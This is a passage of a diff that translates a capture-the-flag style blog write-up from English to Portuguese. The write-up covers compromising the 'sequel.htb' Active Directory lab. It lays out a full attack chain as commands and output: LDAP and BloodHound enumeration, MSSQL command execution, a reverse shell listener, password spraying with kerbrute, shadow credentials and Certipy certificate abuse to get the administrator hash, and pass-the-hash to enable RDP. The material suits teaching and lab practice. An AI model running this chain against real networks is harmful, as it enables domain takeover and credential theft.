 </span></span><span style="display:flex;"><span>$ ldapdomaindump -u sequel.htb<span style="color:#ed9d13">\\</span>rose -p <span style="color:#ed9d13">&#39;KxEPkKe6R8su&#39;</span> 10.10.11.51 -o ldap/                                                        
 </span></span><span style="display:flex;"><span>[*] Connecting to host...
 </span></span><span style="display:flex;"><span>[*] Binding to host
@@ -578,24 +579,25 @@ Now we will do a domain enumeration to help us know <code>Domain</code> settings
 </span></span><span style="display:flex;"><span>[*] Starting domain dump
 </span></span><span style="display:flex;"><span>[+] Domain dump finished
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>// Bloodhound
+</span></span><span style="display:flex;"><span>// via Bloodhound
 </span></span><span style="display:flex;"><span>bloodhound-python -u rose -p KxEPkKe6R8su -ns 10.10.11.51 -d sequel.htb -c All
 </span></span></code></pre></div><p><img alt="AD_Image_3" src="https://pwnbuffer.org/images/mount/ADxpl/ldap.png"></p>
 <p><img alt="domain" src="https://pwnbuffer.org/images/mount/ADxpl/domain.png"></p>
-<p>we can see the local and network users
-the only domain administrator account currently registered</p>
-<h2 id="testing-credentials">
-  Testing Credentials
-  <a class="heading-link" href="#testing-credentials">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
+<p>Podemos ver os usuários locais e de rede.
+A única conta de administrador de domínio cadastrada atualmente.</p>
+<h2 id="testando-credenciais">
+  Testando Credenciais
+  <a class="heading-link" href="#testando-credenciais">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link para o cabeçalho"></i>
+    <span class="sr-only">Link para o cabeçalho</span>
   </a>
 </h2>
-<p>let&rsquo;s try authenticating with <a href="https://www.kali.org/tools/netexec/"  class="external-link" target="_blank" rel="noopener"><code>netexec</code></a> in <strong>mssql</strong></p>
+<p>Vamos tentar autenticar com o <a href="https://www.kali.org/tools/netexec/"  class="external-link" target="_blank" rel="noopener"><code>netexec</code></a> no <strong>mssql</strong></p>
 <div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@kali:~$ proxychains -q netexec mssql 10.10.11.51 -u sa -p <span style="color:#ed9d13">&#39;MSSQLP@ssw0rd!&#39;</span> --local-auth                                                                  [16:53:09]
 </span></span><span style="display:flex;"><span>MSSQL       10.10.11.51     <span style="color:#3677a9">1433</span>   DC01             [*] Windows <span style="color:#3677a9">10</span> / Server <span style="color:#3677a9">2019</span> Build <span style="color:#3677a9">17763</span> (name:DC01) (domain:sequel.htb)
 </span></span><span style="display:flex;"><span>MSSQL       10.10.11.51     <span style="color:#3677a9">1433</span>   DC01             [+] DC01<span style="color:#ed9d13">\s</span>a:MSSQLP@ssw0rd! (Pwn3d!)
-</span></span></code></pre></div><p>See that <code>netexec</code> is marking the target as <em><strong>Pwn3d</strong></em> that means we can execute remote commands</p>
+</span></span></code></pre></div><p><strong>Bingo!</strong>
+Veja que o <code>netexec</code> está marcando o target como <em><strong>Pwn3d</strong></em> isso significa que podemos executar comandos remotos.</p>
 <div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ netexec mssql 10.10.11.51 -u sa -p <span style="color:#ed9d13">&#39;MSSQLP@ssw0rd!&#39;</span> --local-auth -X <span style="color:#ed9d13">&#39;whoami ;net user&#39;</span>                                            [16:56:10]
 </span></span><span style="display:flex;"><span>MSSQL       10.10.11.51     <span style="color:#3677a9">1433</span>   DC01             [*] Windows <span style="color:#3677a9">10</span> / Server <span style="color:#3677a9">2019</span> Build <span style="color:#3677a9">17763</span> (name:DC01) (domain:sequel.htb)
 </span></span><span style="display:flex;"><span>MSSQL       10.10.11.51     <span style="color:#3677a9">1433</span>   DC01             [+] DC01<span style="color:#ed9d13">\s</span>a:MSSQLP@ssw0rd! (Pwn3d!)
@@ -607,9 +609,9 @@ the only domain administrator account currently registered</p>
 </span></span><span style="display:flex;"><span>MSSQL       10.10.11.51     <span style="color:#3677a9">1433</span>   DC01             krbtgt                   michael                  oscar
 </span></span><span style="display:flex;"><span>MSSQL       10.10.11.51     <span style="color:#3677a9">1433</span>   DC01             rose                     ryan                     sql_svc
 </span></span><span style="display:flex;"><span>MSSQL       10.10.11.51     <span style="color:#3677a9">1433</span>   DC01             The <span style="color:#24909d">command</span> completed successfully.
-</span></span></code></pre></div><p>let&rsquo;s scale this to a shell using <a href="https://en.wikipedia.org/wiki/Base64"  class="external-link" target="_blank" rel="noopener"><code>base64</code></a></p>
+</span></span></code></pre></div><p>Vamos escalar isso para uma shell usando <a href="https://en.wikipedia.org/wiki/Base64"  class="external-link" target="_blank" rel="noopener"><code>base64</code></a></p>
 <ul>
-<li>Here I used the <a href="https://revshells.com"  class="external-link" target="_blank" rel="noopener">revshells.com</a> site to generate the payload in base64.</li>
+<li>Aqui eu usei o site <a href="https://revshells.com"  class="external-link" target="_blank" rel="noopener">revshells.com</a> para gerar o payload em base64.</li>
 </ul>
 <p><img alt="rev" src="https://pwnbuffer.org/images/mount/ADxpl/revshell.png"></p>
 <div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span> $ nc -lnvp <span style="color:#3677a9">1337</span>                   
@@ -625,15 +627,15 @@ the only domain administrator account currently registered</p>
 </span></span><span style="display:flex;"><span>SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
 </span></span><span style="display:flex;"><span>SeCreateGlobalPrivilege       Create global objects          Enabled 
 </span></span><span style="display:flex;"><span>SeIncreaseWorkingSetPrivilege Increase a <span style="color:#6ab825;font-weight:bold">process</span> working <span style="color:#24909d">set </span>Disabled
-</span></span></code></pre></div><h2 id="escalating-privileges">
-  Escalating privileges
-  <a class="heading-link" href="#escalating-privileges">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
+</span></span></code></pre></div><h2 id="escalando-privilégios">
+  Escalando privilégios
+  <a class="heading-link" href="#escalando-privil%c3%a9gios">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link para o cabeçalho"></i>
+    <span class="sr-only">Link para o cabeçalho</span>
   </a>
 </h2>
-<p>looking at the files we see a server config file
-inside we can find the password <code>WqSZAF6CysDQbGb3</code>.</p>
+<p>Olhando para os arquivos, vemos um arquivo de configuração do servidor.
+Dentro dele podemos encontrar a senha <code>WqSZAF6CysDQbGb3</code>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#24909d">PS </span>C:\SQL2019\ExpressAdv_ENU&gt; <span style="color:#24909d">type sql-Configuration</span>.INI
 </span></span><span style="display:flex;"><span>[<span style="color:#40ffff">OPTIONS</span>]
 </span></span><span style="display:flex;"><span>ACTION=<span style="color:#ed9d13">&#34;Install&#34;</span>
@@ -662,7 +664,7 @@ inside we can find the password <code>WqSZAF6CysDQbGb3</code>.</p>
 </span></span></span><span style="display:flex;"><span><span style="color:#ed9d13">NPENABLED=&#34;</span><span style="color:#3677a9">1</span><span style="color:#ed9d13">&#34;
 </span></span></span><span style="display:flex;"><span><span style="color:#ed9d13">BROWSERSVCSTARTUPTYPE=&#34;</span>Automatic<span style="color:#ed9d13">&#34;
 </span></span></span><span style="display:flex;"><span><span style="color:#ed9d13">IAcceptSQLServerLicenseTerms=True
-</span></span></span></code></pre></div><p>let&rsquo;s take the list of users we took and <a href="https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/password-spraying/"  class="external-link" target="_blank" rel="noopener">spray</a> that password</p>
+</span></span></span></code></pre></div><p>Vamos usar a lista de usuários que pegamos, e <a href="https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/password-spraying/"  class="external-link" target="_blank" rel="noopener">pulverizar</a> essa senha.</p>
 <div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@kali:~# kerbrute passwordspray  -d sequel.htb --dc 10.10.11.51 users.txt <span style="color:#ed9d13">&#34;WqSZAF6CysDQbGb3&#34;</span>      [17:19:29]
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    __             __               __     
@@ -679,20 +681,19 @@ inside we can find the password <code>WqSZAF6CysDQbGb3</code>.</p>
 </span></span><span style="display:flex;"><span>2025/03/10 17:19:47 &gt;  [+] VALID LOGIN:  sql_svc@sequel.htb:WqSZAF6CysDQbGb3
 </span></span><span style="display:flex;"><span>2025/03/10 17:19:47 &gt;  [+] VALID LOGIN:  ryan@sequel.htb:WqSZAF6CysDQbGb3
 </span></span><span style="display:flex;"><span>2025/03/10 17:19:47 &gt;  Done! Tested <span style="color:#3677a9">6</span> logins (<span style="color:#3677a9">2</span> successes) in 0.927 seconds
-</span></span></code></pre></div><p>ryan is part of the <code>Management Department</code> group within the domain</p>
+</span></span></code></pre></div><p>ryan faz parte do grupo <code>Management Department</code> dentro do domínio</p>
 <p><img alt="map" src="https://pwnbuffer.org/images/mount/ADxpl/grupos-ryan.png"></p>
-<p>let&rsquo;s see what <code>permissions</code> it has</p>
+<p>Vamos ver as <code>permissões</code> que ele tem:</p>
 <p><img alt="map" src="https://pwnbuffer.org/images/mount/ADxpl/writeowner.png"></p>
-<p>and we can see that it has the <code>WriteOwner</code> attribute on a user called <code>CA_SVC</code>
-which means it can take possession of the object and launch a <a href="https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab"  class="external-link" target="_blank" rel="noopener"><code>Shadow Credentials</code></a> attack.</p>
-<h2 id="exploring-miscofiguration">
-  Exploring Miscofiguration
-  <a class="heading-link" href="#exploring-miscofiguration">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
+<p>Podemos ver que ele tem o atributo de <code>WriteOwner</code> em um usuário chamado <code>CA_SVC</code>, ou seja, consegue tomar posse do objeto e lançar um ataque de <a href="https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab"  class="external-link" target="_blank" rel="noopener"><code>Shadow Credentials</code></a>.</p>
+<h2 id="explorando-miscofiguration">
+  Explorando Miscofiguration
+  <a class="heading-link" href="#explorando-miscofiguration">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link para o cabeçalho"></i>
+    <span class="sr-only">Link para o cabeçalho</span>
   </a>
 </h2>
-<p>Basically we&rsquo;re going to transfer the certificate attribute to the user ryan and exploit an <code>ActiveDirectory</code> vulnerability known as <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-26923"  class="external-link" target="_blank" rel="noopener"><code>CVE-2022-26923</code></a> or <code>Certifried</code> in which we&rsquo;re going to create a certificate and extract hashes from <code>Domain Admin</code>.</p>
+<p>Basicamente, vamos transferir o atributo de certificado para o usuário ryan, e explorar uma vulnerabilidade do <code>ActiveDirectory</code> conhecida por <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-26923"  class="external-link" target="_blank" rel="noopener"><code>CVE-2022-26923</code></a> ou <code>Certifried</code> na qual vamos criar um certificado e extrair hashs do <code>Domain Admin</code>.</p>
 <p><img alt="map" src="https://pwnbuffer.org/images/mount/ADxpl/cert.png"></p>
 <div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@kali:~# bloodyAD --host <span style="color:#ed9d13">&#39;10.10.11.51&#39;</span> -d <span style="color:#ed9d13">&#39;sequel.htb&#39;</span> -u <span style="color:#ed9d13">&#39;ryan&#39;</span> -p <span style="color:#ed9d13">&#39;WqSZAF6CysDQbGb3&#39;</span> <span style="color:#24909d">set</span> owner <span style="color:#ed9d13">&#39;ca_svc&#39;</span> <span style="color:#ed9d13">&#39;ryan&#39;</span>
 </span></span><span style="display:flex;"><span>[+] Old owner S-1-5-21-548670397-972687484-3496335370-512 is now replaced by ryan on ca_svc
@@ -703,7 +704,7 @@ which means it can take possession of the object and launch a <a href="https://p
 </span></span><span style="display:flex;"><span>[*] DACL backed up to dacledit-20250206-112058.bak
 </span></span><span style="display:flex;"><span>[*] DACL modified successfully!
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>//Generate our certificate 
+</span></span><span style="display:flex;"><span>//Gerar nosso certificado 
 </span></span><span style="display:flex;"><span>root@kali:~# certipy shadow auto -u <span style="color:#ed9d13">&#39;ryan@sequel.htb&#39;</span> -p <span style="color:#ed9d13">&#34;WqSZAF6CysDQbGb3&#34;</span> -account <span style="color:#ed9d13">&#39;ca_svc&#39;</span> -dc-ip <span style="color:#ed9d13">&#39;10.10.11.51&#39;</span> -target dc01.sequel.htb -ns 10.10.11.51
 </span></span><span style="display:flex;"><span>Certipy v4.8.2 - by Oliver Lyak (ly4k)
 </span></span><span style="display:flex;"><span>
@@ -741,7 +742,7 @@ which means it can take possession of the object and launch a <a href="https://p
 </span></span><span style="display:flex;"><span>    DNS Host Name: <span style="color:#ed9d13">&#39;10.10.11.51&#39;</span>
 </span></span><span style="display:flex;"><span>[*] Certificate has no object SID
 </span></span><span style="display:flex;"><span>[*] Saved certificate and private key to <span style="color:#ed9d13">&#39;administrator_10.pfx&#39;</span>
-</span></span></code></pre></div><p>Now we can authenticate on the server using the new certificate</p>
+</span></span></code></pre></div><p>Agora, podemos nos autenticar no servidor usando o novo certificado.</p>
 <div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@kali:~# certipy auth -pfx administrator_10.pfx -dc-ip 10.10.11.51
 </span></span><span style="display:flex;"><span>root@kali:~# Certipy v4.8.2 - by Oliver Lyak (ly4k)
 </span></span><span style="display:flex;"><span>
@@ -756,8 +757,8 @@ which means it can take possession of the object and launch a <a href="https://p
 </span></span><span style="display:flex;"><span>[*] Saved credential cache to <span style="color:#ed9d13">&#39;administrator.ccache&#39;</span>
 </span></span><span style="display:flex;"><span>[*] Trying to retrieve NT <span style="color:#24909d">hash</span> <span style="color:#6ab825;font-weight:bold">for</span> <span style="color:#ed9d13">&#39;administrator&#39;</span>
 </span></span><span style="display:flex;"><span>[*] Got <span style="color:#24909d">hash</span> <span style="color:#6ab825;font-weight:bold">for</span> <span style="color:#ed9d13">&#39;administrator@sequel.htb&#39;</span>: aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
-</span></span></code></pre></div><p>now we have the admin hash let&rsquo;s use <a href="https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/pass-the-hash-attack/"  class="external-link" target="_blank" rel="noopener"><code>pass-the-hash</code></a> and
-enable <a href="https://en.wikipedia.org/wiki/Remote_Desktop_Protocol"  class="external-link" target="_blank" rel="noopener"><code>RDP</code></a> and connect to have full dominion.</p>
+</span></span></code></pre></div><p>Agora temos a hash do administrador, vamos usar <a href="https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/pass-the-hash-attack/"  class="external-link" target="_blank" rel="noopener"><code>pass-the-hash</code></a> e
+habilitar o <a href="https://en.wikipedia.org/wiki/Remote_Desktop_Protocol"  class="external-link" target="_blank" rel="noopener"><code>RDP</code></a> para nos conectarmos e termos domínio completo.</p>
 <div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@kali:~# netexec smb 10.10.11.51 -u administrator -H <span style="color:#ed9d13">&#34;7a8d4e04986afa8ed4060f75e5a0b3ff&#34;</span> -M rdp -o <span style="color:#40ffff">ACTION</span>=<span style="color:#24909d">enable</span>                            
 </span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             [*] Windows <span style="color:#3677a9">10</span> / Server <span style="color:#3677a9">2019</span> Build <span style="color:#3677a9">17763</span> x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
 </span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             [+] sequel.htb<span style="color:#ed9d13">\a</span>dministrator:7a8d4e04986afa8ed4060f75e5a0b3ff (Pwn3d!)
@@ -766,7 +767,7 @@ enable <a href="https://en.wikipedia.org/wiki/Remote_Desktop_Protocol"  class="e
 </span></span><span style="display:flex;"><span>RDP         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             [+] RDP Port: <span style="color:#3677a9">3389</span>
 </span></span><span style="display:flex;"><span> 
 </span></span><span style="display:flex;"><span>root@kali:~# xfreerdp3 /u:administrator /pth:<span style="color:#ed9d13">&#39;7a8d4e04986afa8ed4060f75e5a0b3ff&#39;</span> /d:sequel.htb /v:10.10.11.51
-</span></span></code></pre></div><p>and we now have full control over <code>ActiveDirectory</code>.</p>
+</span></span></code></pre></div><p>E conseguimos agora, ter controle total sobre o <code>ActiveDirectory</code>.</p>
 <p><img alt="map" src="https://pwnbuffer.org/images/mount/ADxpl/rdp.png"></p>
 <p><img alt="map" src="https://pwnbuffer.org/images/mount/ADxpl/users-in-rdp.png"></p>
 <p><img alt="map" src="https://pwnbuffer.org/images/mount/ADxpl/users-in-rdp.png"></p>
@@ -817,7 +818,7 @@ enable <a href="https://en.wikipedia.org/wiki/Remote_Desktop_Protocol"  class="e
      pwnbuffer 
     ·
     
-    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder (modified)</a>.
+    Promovido por <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder (modified)</a>.
     
   </section>
 </footer>
